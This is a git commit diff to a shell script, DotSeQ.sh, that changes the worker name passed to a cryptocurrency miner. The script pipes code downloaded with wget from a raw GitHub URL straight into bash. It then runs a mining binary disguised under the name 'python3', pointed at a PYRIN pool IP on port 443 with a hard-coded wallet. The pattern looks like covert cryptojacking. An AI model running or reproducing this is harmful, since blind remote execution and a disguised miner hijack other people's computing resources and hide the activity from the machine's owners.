8eedea30fa5e53506231180f117aef053d0187a4
DotAja <142836390+DotAja@users.noreply.github.com>
2024-05-29 02:51:07 +0700

    Update DotSeQ.sh

--- DotSeQ.sh
+++ DotSeQ.sh
@@ -4,6 +4,8 @@ bash -c "$(wget -qO- raw.githubusercontent.com/DotAja/ALONE/main/ALAT-COLI/DotLo
 
 cd dotlol
 
+nomer=$((RANDOM % 50 + 1))
+
 clear
 
-./python3 -a PYRIN --pool stratum+tcp://64.23.180.137:443 --user pyrin:qq5fnz6aelfdruhshjpul598fxyeqfkjh86cvypt2902mghd0ql7gy7g799ff.$(shuf -n 1 -i 1-9999999) --no-cl
+./python3 -a PYRIN --pool stratum+tcp://64.23.180.137:443 --user pyrin:qq5fnz6aelfdruhshjpul598fxyeqfkjh86cvypt2902mghd0ql7gy7g799ff.DOTSEQ$nomer --no-cl
